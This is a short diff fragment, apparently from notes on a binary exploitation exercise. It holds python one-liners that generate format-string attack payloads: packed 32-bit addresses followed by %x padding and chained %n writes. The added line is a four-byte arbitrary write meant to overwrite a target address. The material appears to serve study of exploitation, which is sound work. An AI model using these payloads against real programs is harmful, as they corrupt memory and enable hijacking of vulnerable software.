@@ -38,3 +38,5 @@ OFFSET   TYPE              VALUE
 python -c "print('\x38\x98\x04\x08' + '\x39\x98\x04\x08' + '%4\$n%x%n')" > /tmp/test5
 
 python -c "print('\x38\x98\x04\x08' + '\x39\x98\x04\x08' + '%256\$x' + '%4\$n')" > /tmp/test5
+
+python -c "print('\x38\x98\x04\x08\x39\x98\x04\x08\x3a\x98\x04\x08\x3b\x98\x04\x08' + '%1$148x' + '%4\$n' + '%5\$n' + '%6\$n' + '%7\$n')" > /tmp/test5
